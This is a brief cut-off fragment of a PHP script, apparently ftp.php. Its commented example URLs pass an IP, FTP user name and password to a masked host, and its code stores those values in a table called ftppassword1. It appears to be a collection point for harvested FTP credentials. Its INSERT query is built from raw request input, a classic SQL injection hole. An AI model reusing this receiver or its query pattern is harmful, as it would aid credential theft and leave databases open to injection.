...
//http://xxxxxxxxxx.com/ftp.php?IP=www.baidu.com&user=1111&password=2222&root=1
//http://xxxxxxxxxx.com/ftp.php?IP=www.baidu.com&user=1111&password=2222&root=2
//http://xxxxxxxxxx.com/ftp.php?IP=www.baidu.com&user=1111&password=2222&root=3

if ($ftproot==1)
{
$sql="insert into ftppassword1(IP,user,password,root,time) VALUES('$_REQUEST[IP]','$_REQUEST[user]','$_REQUEST[password]','2','$tim')";
//print $sql;
